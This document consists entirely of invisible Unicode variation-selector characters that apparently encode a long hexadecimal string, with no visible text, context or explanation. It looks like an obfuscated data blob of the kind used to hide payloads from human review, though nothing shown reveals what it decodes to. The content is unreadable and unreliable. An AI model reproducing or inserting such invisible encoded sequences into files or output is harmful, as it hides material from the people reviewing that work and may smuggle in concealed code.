󠄧󠅕󠄨󠄣󠅖󠄢󠅔󠅔󠄡󠅖󠅔󠄥󠅓󠄢󠄤󠅓󠄢󠅔󠄢󠄧󠄣󠅑󠄢󠅒󠄢󠄦󠄧󠄩󠅔󠅒󠄤󠄤󠅕󠄣󠅖󠄨󠅒󠄢󠅖󠄨󠄡󠄤󠄧󠄠󠄢󠄢󠄦󠄣󠄧󠅖󠄥󠅕󠄩󠅒󠅔󠄩󠄧󠅒󠅔󠅕󠄤󠄢󠅕󠄠󠄥󠄠󠅓󠅕󠄩󠅔󠄦󠅒󠄡󠅖󠄧󠅔󠄦󠄩󠄣󠅖󠄩󠄥󠄦󠅓󠅖󠄢󠅓󠅓󠄡󠄦󠅕󠄥󠅓󠄤󠄠󠄢󠅑󠅕󠄧󠄦󠄨󠄤󠄥󠄤󠄨󠄡󠄣󠅕󠄠󠅖󠄠󠄧󠄡󠅖󠅑󠄠󠅒󠅒󠅓󠅑󠄧󠄠󠅔󠅓󠄦󠄨󠅓󠄦󠅔󠄡󠄨󠅔󠅔󠄠󠄨󠄢󠄩󠄠󠄧󠄨󠅕󠅖󠅓󠅒󠅑󠅔󠄨󠅖󠅔󠅓󠄤󠄠󠄦󠄡󠄤󠄦󠄨󠄨󠄧󠄣󠅖󠄩󠅖󠄣󠅒󠅒󠅖󠄥󠄥󠅔󠅑󠄥󠄨󠄢󠅕󠄤󠄡󠅒󠄤󠅓󠅖󠄡󠅔󠅒󠄧󠄧󠅒󠅒󠄠󠅔󠄧󠄩󠄨󠅕󠄣󠅒󠄧󠄠󠅕󠄠󠄥󠅕󠄧󠄢󠅖󠅑󠅕󠅖󠄤󠅒󠄠󠄠󠅕󠄥󠄤󠅔󠄣󠅔󠅖󠅔󠄨󠅔󠄢󠅔󠄠󠄣󠅒󠄩󠅒󠅔󠄧󠄩󠄨󠄢󠅓󠅔󠄠󠄦󠄧󠄨󠅔󠄩󠅕󠄦󠄥󠄤󠅖󠅒󠅓󠅔󠅓󠄩󠄢󠄦󠅓󠄢󠄤󠅖󠄢󠅓󠄨󠄤󠄡󠄨󠄤󠄡󠅓󠅒󠄦󠅖󠅓󠅑󠄡󠅖󠅕󠄦󠅖󠅖󠅔󠅖󠄥󠄩󠅓󠄧󠅕󠄩󠄨󠅒󠄦󠄩󠅑󠄢󠅖󠅓󠄩󠄨󠄢󠄠󠅓󠄣󠅓󠅕󠅖󠄣󠄡󠅕󠅔󠄣󠅔󠅖󠅖󠄤󠄧󠅑󠄠󠅑󠄨󠄨󠄡󠄠󠅓󠄣󠄠󠅓󠄨󠅑󠄤󠅖󠅕󠄠󠅑󠅕󠅑󠄨󠄥󠅑󠄦󠄠󠄩󠄡󠅓󠅖󠄩󠄡󠄤󠅔󠄦󠄦󠄥󠄣󠄩󠄠󠅑󠅖󠄩󠄢󠄤󠅑󠅔󠄩󠄡󠄤󠄤󠅖󠅖󠄤󠄥󠄤󠄤󠄣󠄠󠄨󠄤󠅑󠅑󠄦󠄥󠄦󠄠󠄧󠄧󠄥󠄠󠅔󠅔󠄠󠅔󠄠󠄩󠄤󠄢󠄧󠄢󠄧󠅒󠄨󠄢󠄥󠅑󠄧󠅓󠅕󠄧󠅖󠄧󠅓󠄤󠄡󠄢󠄡󠄤󠅔󠄥󠄦󠅔󠄣󠅔󠄣󠅓󠄠󠅓󠄤󠄤󠄨󠄣󠄩󠄥󠅖󠄠󠄠󠅑󠄦󠄥󠅒󠄢󠅑󠄣󠅔󠅔󠄢󠄢󠄣󠄦󠄩󠄣󠄥󠄠󠅕󠄣󠅒󠄨󠅕󠅔󠄦󠄦󠅒󠄦󠅔󠅓󠅑󠄦󠅒󠅔󠅕󠅑󠄥󠄢󠅔󠅓󠅖󠅖󠄦󠄢󠄦󠅔󠄠󠄩󠄥󠅑󠅒󠄡󠄩󠄩󠄢󠄧󠄦󠄣󠅓󠅕󠅔󠄨󠄩󠅔󠄧󠄩󠄥󠄧󠅑󠅔󠄠󠄢󠄩󠄠󠄡󠄠󠄣󠄡󠅔󠅓󠄠󠅖󠅑󠄣󠄨󠅖󠄡󠄨󠄥󠄥󠅓󠅓󠄣󠄨󠄥󠅔󠄢󠄧󠅔󠄣󠄣󠄧󠄥󠄣󠄧󠄩󠅒󠄥󠄥󠄧󠄨󠄡󠅑󠅔󠅖󠄠󠅖󠅖󠄠󠅔󠄡󠄥󠄤󠄠󠅔󠄥󠄤󠄦󠄥󠅑󠄡󠄡󠄨󠅓󠄤󠄣󠄠󠄡󠄠󠅖󠄩󠄩󠄨󠄦󠄥󠄤󠄢󠅕󠄣󠄡󠄣󠅔󠄢󠄤󠄣󠄩󠄢󠅒󠄨󠄥󠅔󠅔󠅕󠄡󠄠󠄩󠅖󠄥󠄩󠄠󠄨󠅒󠄤󠄥󠄤󠄡󠄡󠄢󠄠󠄤󠄩󠅒󠄢󠄨󠄩󠄧󠄢󠄣󠅕󠅒󠄤󠄣󠄤󠄤󠄥󠅕󠄤󠄤󠅑󠅑󠄥󠅓󠄣󠅕󠅔󠄡󠄧󠄥󠄡󠄨󠄧󠄧󠅕󠅔󠅑󠄡󠅓󠄧󠅑󠄧󠅔󠅒󠅔󠄡󠅒󠄡󠄩󠄥󠅖󠄤󠄧󠄩󠅒󠄧󠄩󠅓󠅒󠄤󠅑󠄣󠄨󠅔󠄠󠄩󠄧󠅒󠄨󠅔󠄠󠄡󠄠󠄩󠄢󠅖󠅕󠄢󠅖󠅒󠄠󠄢󠅓󠄢󠅖󠅑󠄧󠄣󠄦󠅕󠄥󠄢󠄧󠄧󠅓󠄡󠄨󠄠󠅔󠅖󠄢󠄥󠄦󠅖󠅓󠄩󠄢󠅒󠅕󠄨󠄦󠄧󠄦󠄣󠄧󠄣󠄣󠄨󠄥󠅖󠄥󠄩󠅕󠅖󠄥󠄥󠅖󠅕󠄧󠄩󠄦󠅑󠅕󠅕󠅕󠄣󠄠󠄡󠅓󠅑󠄤󠄩󠄨󠄣󠄩󠅔󠄥󠄧󠅖󠅒󠄨󠄤󠅒󠄩󠄨󠄤󠅑󠅔󠅕󠄩󠄠󠅕󠄡󠄡󠄩󠄧󠄨󠅖󠄩󠄢󠅕󠄩󠅖󠄠󠅖󠄤󠅑󠄤󠄢󠄡󠄣󠄧󠅒󠄡󠅒󠅕󠄤󠄦󠄤󠄨󠅕󠄢󠄧󠅕󠄥󠅕󠄥󠅒󠄢󠅔󠄥󠄣󠄩󠅒󠅔󠅖󠅔󠅓󠅒󠄢󠅖󠄡󠄧󠅔󠅓󠄤󠅖󠄠󠅖󠄧󠅒󠄠󠅖󠄨󠄧󠅒󠄦󠄧󠅒󠅓󠄨󠅑󠅕󠄢󠄤󠄢󠄡󠅕󠄣󠅓󠅒󠄢󠄩󠅔󠄥󠅑󠅒󠅔󠅔󠄨󠅓󠅔󠄣󠅔󠄣󠅒󠄠󠅖󠄦󠄤󠄠󠅔󠅒󠄣󠄢󠄦󠄧󠅕󠄠󠅖󠅓󠄧󠄤󠅔󠄣󠄩󠄩󠄩󠄣󠄤󠄢󠄤󠄢󠄧󠄤󠄢󠄧󠄩󠄢󠄡󠄩󠅖󠄩󠄤󠄠󠄩󠄥󠅔󠄥󠄩󠄩󠄨󠄣󠅔󠄨󠅕󠄧󠄠󠅕󠅓󠅒󠅕󠅑󠄡󠅖󠅓󠄢󠅑󠄢󠅕󠄧󠄤󠄨󠅑󠅓󠄤󠄦󠄧󠄢󠄤󠅓󠅒󠅔󠅓󠄡󠅑󠅕󠄧󠄥󠅓󠄨󠄢󠄣󠄥󠅑󠅒󠄡󠅒󠅖󠄩󠄣󠅖󠄡󠄦󠅓󠅓󠅑󠄣󠅒󠄧󠅒󠅕󠄩󠅔󠅔󠄥󠄦󠄧󠄩󠄡󠅖󠄦󠄤󠄨󠅑󠄦󠅔󠄠󠄢󠅒󠅔󠄧󠅑󠅖󠅔󠅑󠄤󠄠󠄨󠄡󠅒󠄧󠄦󠄩󠄩󠄦󠄤󠄨󠄡󠄤󠄡󠄦󠄩󠄠󠄧󠅖󠄣󠄩󠄩󠄧󠄢󠄤󠄠󠄠󠅖󠄨󠅔󠄧󠅔󠄠󠄠󠄥󠄩󠄥󠄨󠄢󠄠󠄡󠅖󠄢󠄥󠄠󠄨󠄥󠄨󠅕󠅓󠄤󠅕󠄩󠄣󠅔󠅒󠄢󠄥󠄨󠄠󠄩󠅒󠅒󠅒󠄧󠅒󠅔󠄠󠅖󠄤󠄤󠅔󠅒󠄨󠄠󠄣󠄩󠄧󠅕󠄨󠅓󠅕󠅑󠅒󠄦󠅒󠅓󠅖󠅖󠄤󠄣󠅒󠅔󠄥󠄧󠄡󠄩󠅒󠅔󠄠󠅓󠄩󠅓󠄣󠄡󠅕󠅕󠄧󠄤󠄠󠅕󠅕󠄢󠄡󠄤󠄨󠄨󠄥󠄩󠄩󠅒󠄡󠄩󠄧󠄢󠅖󠅒󠄦󠅑󠄠󠄡󠅕󠅑󠅓󠄧󠅓󠅕󠅕󠅕󠄡󠄥󠄠󠄦󠅔󠄧󠄨󠄥󠄤󠄠󠄠󠄧󠄥󠅒󠅑󠅓󠄧󠅕󠅓󠄧󠄤󠄦󠄤󠄦󠅑󠄧󠄡󠅕󠅔󠄩󠄦󠄧󠅓󠄩󠄠󠄤󠄤󠄧󠄣󠅕󠄨󠄠󠅔󠄤󠅑󠅓󠄢󠄦󠄨󠄠󠄣󠄠󠄤󠅕󠅖󠅒󠄡󠄨󠅔󠄤󠄧󠄦󠄨󠄠󠄦󠄥󠄥󠄥󠄩󠄦󠄨󠅒󠅑󠅑󠅓󠄢󠄡󠄣󠄠󠅒󠄢󠄢󠄤󠅒󠄢󠄨󠄩󠄩󠄡󠄠󠅖󠄦󠄦󠄦󠄠󠅕󠅒󠄢󠄦󠅑󠅔󠄢󠅔󠅓󠄩󠄧󠄡󠅒󠄤󠄠󠅑󠄧󠄠󠄣󠅕󠄨󠄦󠄧󠄩󠄡󠄦󠄡󠅑󠅒󠅓󠄦󠅖󠅒󠄩󠄧󠄦󠄠󠄡󠄧󠅔󠄢󠅒󠄢󠄨󠄦󠅑󠅑󠅖󠄩󠄥󠄩󠅖󠅖󠄢󠄤󠅒󠄦󠄣󠄩󠄧󠄡󠄦󠄧󠅔󠅓󠄣󠅔󠅔󠅒󠄣󠄤󠄤󠅔󠄣󠄦󠄥󠅒󠄡󠅖󠅑󠅖󠅓󠅒󠄦󠄨󠄧󠄤󠄢󠄥󠄧󠅓󠅕󠄩󠄦󠅒󠅕󠄦󠅑󠅔󠅕󠄡󠄡󠅓󠅔󠄧󠄡󠄤󠅑󠄢󠄨󠄣󠅓󠅑󠅒󠄥󠅓󠅖󠄣󠄩󠅔󠄨󠅑󠅖󠅓󠅒󠄨󠄩󠄦󠄤󠄩󠅕󠄧󠅕󠅓󠄣󠄥󠄠󠄣󠄢󠅕󠄠󠄥󠅓󠅓󠄠󠄣󠄩󠅕󠄢󠄩󠄩󠅓󠄦󠄥󠄠󠄠󠅑󠄧󠄢󠄢󠄤󠄨󠅒󠄠󠄡󠄠󠄧󠅖󠄡󠅒󠄩󠄡󠄧󠄥󠄦󠄤󠄩󠄨󠄧󠄨󠄣󠅖󠅓󠅔󠅕󠅔󠄢󠄦󠄩󠅔󠄣󠅔󠄨󠄡󠄩󠅖󠄨󠄩󠅕󠄢󠄩󠅑󠅕󠅖󠅑󠄢󠄣󠄩󠅔󠅓󠅕󠄡󠅓󠅔󠄣󠄥󠅖󠄢󠄡󠄡󠄤󠅖󠄧󠅔󠅔󠄧󠅑󠅓󠅓󠅒󠄠󠄥󠄡󠄧󠄤󠄤󠄠󠄣󠄠󠅑󠄣󠄦󠄡󠄢󠄡󠅕󠅔󠄣󠄥󠄤󠄨󠄢󠄠󠄧󠅔󠄡󠄧󠅒󠄤󠄨󠄤󠄣󠅒󠅑󠄥󠅕󠄧󠄦󠄥󠄢󠅑󠅕󠄢󠅔󠄢󠄠󠄣󠄣󠅔󠄨󠅕󠅑󠄠󠄠󠄣󠅕󠅕󠅖󠅔󠄨󠄠󠄥󠄥󠅑󠄧󠅖󠄩󠅒󠄡󠄧󠄡󠅔󠄣󠄤󠄤󠄢󠅑󠅕󠅔󠄥󠅔󠅔󠄢󠅑󠅔󠅖󠅑󠄢󠄡󠅕󠄤󠄤󠄢󠅔󠄨󠄠󠄦󠄧󠅓󠄩󠄣󠅕󠄥󠄨󠅒󠄡󠄣󠄦󠄢󠄡󠄠󠅖󠅓󠅒󠄩󠄤󠄩󠅕󠄧󠄠󠄢󠄠󠄡󠄦󠅕󠄣󠅒󠅒󠅖󠄥󠄡󠄠󠅒󠅑󠅕󠄨󠄤󠄡󠅓󠅕󠅕󠄡󠄨󠄧󠅑󠄣󠄨󠅒󠅕󠄦󠄥󠄦󠅖󠅑󠅖󠅑󠄠󠄩󠄨󠄢󠄢󠄠󠄨󠄣󠄧󠄩󠄣󠅒󠄧󠄤󠅖󠄨󠅒󠄧󠅓󠅓󠄥󠄦󠄢󠅓󠄠󠅑󠅓󠄡󠄣󠅖󠅒󠄠󠄧󠄣󠄤󠅔󠄥󠅓󠄣󠄣󠄧󠅔󠄣󠄥󠅔󠄣󠄧󠅓󠅑󠄧󠅕󠄡󠅒󠄦󠄦󠄡󠅒󠄨󠄠󠅒󠄨󠅖󠄢󠄡󠄣󠅕󠅓󠄢󠅔󠅑󠄣󠅑󠄧󠄥󠄦󠄨󠄩󠅔󠅖󠅔󠅖󠄢󠅒󠄦󠄣󠄠󠅓󠅑󠄣󠅖󠅕󠄦󠅕󠄥󠄢󠅑󠄡󠄩󠄠󠅓󠄦󠅓󠄥󠄦󠄡󠅒󠅓󠄠󠄣󠅒󠅑󠅓󠅖󠅔󠄢󠄩󠅑󠅖󠅖󠄩󠄥󠅕󠄠󠅔󠄦󠄧󠅑󠄢󠄨󠅑󠄧󠅓󠅕󠄦󠄠󠄥󠄡󠄣󠅒󠄢󠄢󠄨󠄥󠅒󠅓󠅒󠅑󠄠󠄠󠅒󠄦󠄥󠅔󠄩󠄠󠄠󠅑󠄥󠅑󠅖󠄠󠄠󠅓󠄦󠄢󠄦󠄢󠄠󠄡󠅔󠄧󠅓󠄩󠄩󠄣󠄨󠄣󠅑󠅑󠄠󠅕󠄤󠅓󠅖󠄣󠄤󠄥󠅒󠅖󠄢󠄤󠄩󠄦󠄣󠅒󠅔󠄢󠄣󠅔󠄩󠄩󠄡󠅒󠄧󠄩󠄠󠄨󠄡󠄢󠄨󠅒󠅕󠄣󠄦󠅒󠄧󠄦󠄡󠄠󠅕󠅑󠄣󠅖󠅑󠅑󠄡󠅖󠄩󠄢󠄤󠄦󠄤󠅔󠅑󠄨󠄢󠅓󠅔󠄡󠄤󠅖󠄥󠄧󠅕󠅔󠄤󠄧󠄨󠄢󠄤󠄥󠄦󠄦󠄠󠅕󠅔󠄤󠅑󠄡󠄢󠅓󠅖󠅔󠅑󠅒󠅑󠅑󠄠󠅔󠄨󠄤󠄤󠅖󠄠󠅓󠅑󠄦󠄥󠄢󠄨󠄡󠄤󠄡󠄨󠄣󠅔󠅖󠄤󠅔󠄥󠄨󠅒󠄡󠅕󠅑󠅒󠄧󠅓󠅕󠄢󠄨󠄥󠅓󠄡󠄠󠅖󠄣󠄢󠅖󠄩󠄥󠅖󠅓󠄨󠄥󠅕󠅔󠅓󠄧󠅓󠄧󠅖󠅕󠅒󠅑󠅔󠄢󠄥󠅕󠄨󠅕󠅕󠄨󠅓󠅒󠄣󠄡󠅑󠄥󠅒󠄧󠄢󠄦󠄧󠅖󠅒󠅓󠅓󠄨󠅕󠄢󠅑󠄡󠄨󠅓󠄨󠄡󠄣󠄤󠄠󠄦󠅒󠄠󠄣󠄥󠄤󠅕󠄥󠄢󠄦󠄨󠅖󠅖󠄤󠄥󠅕󠄠󠄦󠄤󠄥󠅒󠅕󠅖󠄢󠄣󠄣󠄥󠄩󠄣󠄥󠄡󠄤󠄥󠄩󠅒󠄢󠅒󠅕󠄥󠄦󠄨󠅖󠅑󠄡󠅓󠅒󠅒󠄧󠅑󠄣󠅕󠄥󠄩󠄦󠅕󠅕󠄩󠄦󠄢󠅒󠄨󠅓󠄦󠅓󠄩󠅖󠅔󠄠󠅒󠄠󠄩󠅔󠅕󠅓󠅕󠄦󠅓󠄠󠄨󠅖󠄤󠄢󠄣󠄩󠄤󠄩󠅕󠄡󠄣󠄥󠄩󠄡󠅔󠄩󠄩󠄦󠅒󠅑󠅕󠄧󠄨󠅔󠄢󠄢󠅔󠄧󠄦󠄩󠄥󠄦󠄢󠅔󠄥󠅓󠅔󠄥󠄠󠅖󠄩󠄢󠅑󠄨󠄩󠅕󠄣󠄨󠄡󠄥󠅓󠄢󠄩󠄡󠅓󠅕󠄠󠄧󠄦󠄣󠄣󠄡󠄣󠄥󠄡󠄩󠄨󠄦󠄢󠄠󠄢󠅖󠄡󠄤󠅓󠅒󠅑󠄢󠅔󠅒󠄧󠅑󠅔󠄣󠅕󠄦󠄨󠅒󠄨󠄣󠅔󠅑󠅑󠄩󠄢󠄧󠅖󠄥󠄩󠅕󠅕󠅒󠄨󠅔󠄦󠄡󠅔󠄨󠅓󠄢󠄦󠄣󠅖󠅓󠄧󠄡󠄥󠄤󠄢󠄩󠄢󠅖󠄥󠅖󠄥󠄩󠅕󠄦󠅔󠄤󠅕󠅕󠄡󠄤󠄢󠄣󠄧󠅖󠄢󠄩󠄦󠄤󠄠󠄠󠄩󠄡󠄨󠄠󠄦󠅓󠄤󠄡󠅓󠄣󠄥󠄧󠅔󠄠󠅒󠅖󠄤󠄧󠅒󠅔󠄢󠄧󠅑󠄤󠄤󠄨󠅒󠅖󠅕󠄨󠄡󠄢󠅓󠅒󠄡󠄡󠄢󠄢󠅔󠄦󠄠󠅑󠄢󠄧󠅖󠄧󠅖󠅖󠅑󠄢󠅕󠄦󠄣󠅕󠅔󠅑󠄧󠅕󠄨󠅓󠄤󠄠󠄩󠄠󠅔󠅑󠄩󠅔󠄢󠅑󠅓󠅒󠄥󠅑󠄤󠄢󠄦󠄩󠅔󠅑󠄦󠄣󠄠󠄦󠅓󠄣󠄤󠄡󠄢󠅑󠄦󠅒󠄢󠄢󠄥󠄢󠄧󠄣󠅔󠄠󠄡󠄩󠄧󠅕󠅑󠅕󠄦󠅔󠄢󠄥󠄠󠅑󠄩󠅖󠄩󠄧󠄠󠄨󠄢󠄠󠄨󠅕󠅕󠄦󠅔󠄩󠅑󠄣󠄠󠄦󠄥󠄨󠅔󠄣󠅕󠄠󠅓󠄤󠄢󠅓󠄥󠄢󠅓󠄡󠄧󠅑󠄦󠄦󠄣󠅑󠅑󠅔󠅒󠄢󠅑󠅒󠅖󠅓󠄩󠅔󠄢󠅓󠄩󠄨󠄦󠅓󠅒󠅒󠅒󠄧󠅓󠄣󠄤󠅒󠄧󠄣󠄡󠅕󠄠󠅑󠄤󠄤󠄨󠅒󠅒󠄠󠄩󠅒󠅔󠅓󠄣󠄦󠅓󠄩󠄣󠄦󠄢󠄩󠄦󠄠󠄥󠄡󠄩󠅕󠅑󠄨󠄠󠄩󠅔󠄣󠄤󠅕󠄢󠄤󠄤󠄣󠄦󠄥󠅔󠅖󠅖󠄣󠅔󠄦󠅑󠅒󠅖󠅓󠅑󠄣󠄥󠄦󠄤󠄠󠅕󠅖󠄡󠄡󠅕󠄣󠄧󠄦󠅔󠅒󠄨󠅓󠅑󠄨󠅑󠅓󠄨󠄤󠅑󠅑󠄣󠄥󠅖󠄦󠄣󠅕󠄠󠄣󠄤󠅕󠄢󠄤󠄠󠄨󠄨󠄦󠄦󠅑󠄩󠅖󠄠󠄧󠄣󠄤󠄦󠅒󠄣󠄠󠄧󠄡󠄨󠄩󠄡󠄠󠄡󠄠󠄢󠅕󠄥󠅒󠄢󠄣󠅖󠅒󠄣󠄣󠅕󠅑󠄩󠄥󠄩󠅒󠅓󠄧󠅔󠅓󠄦󠅑󠄤󠅓󠄤󠅖󠄧󠅕󠄦󠄠󠄠󠄡󠅖󠅒󠄥󠄧󠄩󠅕󠅔󠄡󠅕󠄠󠅓󠄤󠄠󠅓󠄨󠄦󠄡󠄣󠄧󠅔󠅓󠄤󠄡󠄨󠅔󠄦󠄠󠄧󠅖󠅓󠅑󠄠󠄣󠄥󠄢󠄢󠄨󠄣󠄦󠅔󠅒󠄩󠅑󠄣󠅖󠅔󠅕󠅖󠅒󠅑󠅕󠄢󠄣󠅕󠄩󠄢󠄩󠅔󠄤󠄣󠅔󠄥󠅒󠄧󠅔󠅒󠄥󠅔󠅑󠄥󠄢󠄦󠄤󠅑󠅕󠄦󠅑󠄡󠅖󠄠󠄨󠅑󠅕󠄧󠄧󠄧󠄧󠄦󠄦󠅔󠅑󠅕󠄣󠄦󠅖󠅖󠄣󠅖󠄣󠅖󠅑󠄨󠄠󠄥󠄠󠄥󠄠󠄢󠄤󠅑󠄥󠄡󠄡󠅔󠄥󠅖󠄦󠄦󠅒󠄢󠄠󠄥󠄣󠄨󠄤󠄠󠅔󠄢󠄢󠅖󠄣󠄩󠄥󠅖󠅒󠅑󠄦󠅓󠅓󠄣󠄠󠄣󠄠󠅒󠄡󠄤󠄧󠄧󠅑󠄣󠅓󠅓󠄤󠅑󠄤󠅔󠅔󠅖󠄧󠄤󠄩󠄢󠄥󠅓󠅒󠄠󠄩󠄦󠄦󠄧󠄠󠅑󠄦󠄢󠄡󠄡󠄣󠄧󠄧󠅔󠅔󠄢󠅕󠅔󠅓󠄦󠅕󠄥󠅓󠅒󠄦󠄦󠅑󠄣󠅒󠅕󠅕󠄥󠄨󠄨󠅒󠄡󠅓󠅔󠅕󠄢󠄦󠄤󠅑󠄨󠅕󠄧󠅖󠄡󠅒󠄢󠅖󠄩󠄣󠄠󠄤󠅒󠄡󠄥󠄥󠄠󠄣󠄤󠄧󠄩󠄩󠄨󠄧󠄥󠅕󠄨󠄢󠅑󠅒󠄠󠅒󠄥󠄦󠄨󠄧󠅖󠄢󠄡󠄨󠄠󠅖󠄦󠄧󠄣󠄧󠄨󠄦󠄡󠅒󠄩󠄢󠄧󠄡󠅕󠄦󠄩󠄩󠄠󠄤󠄧󠄤󠄤󠅕󠄩󠅖󠅕󠅓󠄧󠄣󠄦󠄡󠅔󠄣󠅔󠄢󠄣󠅑󠄦󠄣󠄢󠄠󠄥󠄢󠅓󠅓󠄧󠄢󠄢󠅓󠅕󠄢󠄡󠅕󠅔󠄠󠅔󠅒󠄤󠄩󠅓󠄣󠄨󠅒󠄤󠄩󠅓󠅕󠅔󠄥󠅕󠄦󠄤󠅓󠅔󠄠󠄥󠅖󠅖󠄥󠄢󠄦󠄩󠄨󠅑󠄣󠄣󠄤󠅓󠅓󠅖󠄧󠅑󠅓󠅓󠅖󠄧󠄠󠅑󠅔󠄩󠄤󠅕󠅔󠅕󠄦󠅖󠄩󠄩󠅒󠅑󠄢󠄠󠅑󠅑󠅓󠄤󠄥󠅑󠅒󠅓󠄢󠄠󠄧󠄢󠅕󠄨󠅖󠄥󠄣󠅖󠅕󠅔󠅖󠅕󠅕󠅖󠄨󠄤󠅑󠄠󠄤󠅔󠄦󠅑󠄢󠅒󠅓󠄥󠄦󠅑󠄩󠄩󠅓󠄦󠄦󠄥󠅑󠄨󠄥󠄥󠄦󠄨󠄥󠄩󠅔󠄦󠅖󠄠󠅔󠅑󠄢󠄦󠄠󠄥󠄠󠄤󠅒󠅑󠄧󠄩󠅓󠄧󠅒󠄥󠅔󠄥󠄩󠄦󠄥󠅓󠅑󠄨󠄡󠄨󠅖󠄩󠄨󠄤󠅑󠄢󠄢󠄣󠄢󠅔󠄦󠄧󠅒󠅑󠅑󠄩󠄥󠄠󠄥󠄢󠄩󠄠󠄢󠄩󠄨󠄧󠄨󠅑󠅕󠄩󠅓󠅖󠄦󠅓󠄣󠄣󠄤󠄢󠄨󠄦󠅓󠅖󠄤󠅒󠄢󠄦󠅑󠄨󠄠󠄡󠅖󠅔󠄦󠄨󠄡󠄧󠅑󠄠󠄠󠄨󠅖󠅔󠄦󠄦󠄧󠄦󠅔󠅒󠅕󠄦󠅒󠅓󠅑󠅒󠅕󠄥󠄦󠄦󠅒󠅖󠅔󠄦󠄧󠅕󠄧󠄡󠄠󠅒󠄧󠅔󠄠󠅓󠄠󠅔󠄡󠄧󠄠󠄡󠅒󠄥󠄦󠅕󠅖󠄠󠄦󠄧󠄢󠄢󠅑󠄡󠄩󠅖󠅑󠅕󠅔󠅔󠄣󠄢󠅕󠄥󠄨󠄤󠄢󠅕󠄦󠄨󠅖󠄨󠅔󠄥󠄢󠄣󠄦󠅕󠅓󠄠󠄤󠄤󠄤󠅓󠄩󠄡󠅓󠄨󠄣󠅕󠄤󠅖󠄤󠄩󠅖󠄦󠅑󠄣󠅕󠅒󠄢󠅒󠄧󠄩󠅕󠅒󠅑󠄠󠄧󠅒󠄨󠅕󠄦󠄣󠄣󠄨󠄢󠅖󠄡󠄧󠄩󠅓󠅒󠅕󠄦󠅓󠄢󠄤󠅕󠄧󠄡󠄦󠄣󠅕󠅑󠄣󠄦󠄢󠄡󠅔󠄢󠄨󠄥󠅓󠄧󠄥󠄤󠅔󠄢󠄤󠅓󠅑󠄥󠄩󠅒󠄨󠄩󠄤󠅑󠄠󠅕󠄠󠅔󠄠󠄡󠄢󠅓󠅖󠅓󠄤󠅓󠅒󠄤󠄨󠄦󠄥󠅕󠅖󠅑󠄣󠅓󠄣󠅕󠄤󠄤󠅔󠅖󠄢󠄠󠅓󠅔󠄢󠅑󠄢󠅑󠅓󠄨󠄥󠅖󠅖󠅓󠅑󠄤󠄡󠄥󠄢󠅓󠄥󠄨󠅓󠄨󠄥󠄨󠄣󠅒󠄡󠄠󠄥󠅕󠄠󠄧󠄩󠅕󠄧󠄢󠅑󠄡󠅑󠅕󠄨󠅕󠄦󠄡󠅔󠄠󠄡󠄦󠄨󠄥󠄥󠅔󠄡󠅓󠅔󠅔󠄠󠄡󠄧󠅑󠄧󠄢󠄧󠅖󠄡󠄢󠅒󠄢󠄥󠅒󠅖󠄧󠄩󠅑󠄦󠄠󠄧󠄩󠄥󠄢󠄦󠄩󠄡󠄨󠄡󠄣󠄢󠄣󠄨󠄧󠅒󠄢󠄠󠄢󠄦󠄧󠅖󠄣󠄣󠄥󠄤󠄠󠅔󠄥󠄧󠄩󠄣󠄩󠅔󠄡󠄤󠄦󠄥󠄣󠄠󠅕󠄨󠅖󠅑󠄠󠄨󠅖󠄢󠄥󠅑󠅓󠄢󠄡󠄡󠅕󠄩󠄥󠅓󠄨󠄧󠄣󠄧󠅒󠄤󠄠󠄡󠄢󠄥󠅑󠅒󠅖󠄦󠄥󠄦󠅕󠄧󠄩󠄣󠅑󠅑󠅖󠅓󠄣󠄢󠅕󠅑󠄡󠅕󠄤󠄩󠄢󠄦󠅓󠄧󠅑󠄧󠅖󠄨󠄠󠄩󠄧󠄤󠅖󠄠󠄧󠅕󠅒󠄨󠅑󠅑󠄠󠅑󠄣󠅒󠅑󠅓󠅖󠅖󠄧󠄩󠄧󠄦󠄠󠄢󠅒󠄣󠄤󠄤󠅖󠄡󠅒󠄢󠄤󠄣󠄣󠄣󠅔󠄡󠅕󠅔󠄢󠅔󠄡󠅔󠄤󠅕󠄠󠅕󠅒󠄡󠅓󠅓󠄧󠄩󠄦󠄩󠄠󠄥󠅒󠄢󠄧󠅖󠄨󠄩󠅓󠄢󠅕󠄨󠅔󠄥󠅖󠅒󠄦󠄣󠄦󠄢󠄥󠄤󠄣󠄦󠄨󠄨󠄨󠄧󠅔󠅓󠄨󠅑󠄦󠄠󠅔󠅖󠄤󠅔󠄥󠄥󠄢󠄦󠄢󠅖󠅖󠅔󠄤󠅒󠅕󠅔󠅑󠅔󠄧󠄨󠄤󠅑󠄩󠄩󠅕󠅓󠄤󠄣󠄦󠅔󠅓󠅖󠅑󠅖󠄧󠄤󠄠󠄣󠄦󠄩󠄦󠄩󠅒󠄥󠄠󠄣󠄦󠅔󠄩󠅓󠅕󠄨󠄦󠄥󠄣󠄦󠄢󠅒󠄦󠅒󠅕󠅓󠄥󠄢󠅒󠄦󠄤󠅕󠄩󠅒󠄦󠄢󠅔󠄡󠅕󠄡󠄩󠄣󠄢󠄢󠄦󠄩󠅑󠄤󠅒󠅓󠅓󠄦󠄠󠄤󠄥󠅓󠄠󠅕󠅑󠄩󠄢󠅓󠄡󠄣󠄦󠄩󠅔󠅓󠄥󠅒󠅖󠅓󠄤󠅖󠅓󠄡󠅒󠄨󠄨󠅕󠄨󠄢󠄩󠄡󠄤󠄤󠅔󠄣󠅕󠅑󠄡󠅓󠅓󠅖󠅖󠄩󠄠󠄡󠅓󠄤󠅓󠅑󠄦󠄦󠄧󠄦󠄥󠄨󠄥󠅕󠅓󠄦󠄡󠄢󠄩󠅓󠅑󠄧󠄣󠄣󠅖󠅔󠄥󠄦󠄨󠅒󠄠󠅓󠄡󠅖󠄥󠄦󠅒󠅕󠄢󠅒󠅑󠅓󠄣󠅔󠅓󠄢󠄦󠄩󠅕󠄡󠄧󠅒󠄠󠄤󠄢󠅑󠄩󠅖󠅒󠄠󠄩󠄠󠄥󠅑󠄩󠄤󠅓󠅕󠅓󠅔󠅔󠅒󠄢󠄩󠅔󠄣󠄡󠅕󠅓󠅕󠅕󠄠󠄩󠄡󠄦󠅖󠅑󠄤󠅕󠅖󠄢󠅓󠄥󠄧󠅖󠅖󠄩󠅕󠄧󠄠󠄨󠄤󠄥󠄣󠅖󠄥󠄥󠅒󠄢󠅑󠅔󠄥󠄨󠅖󠄩󠄧󠅒󠄨󠅒󠅖󠄤󠄣󠅓󠄤󠅕󠄤󠅒󠄣󠅕󠄣󠅖󠅒󠄨󠅖󠄧󠄧󠅓󠄠󠅒󠅒󠄩󠅖󠄨󠄠󠄤󠄠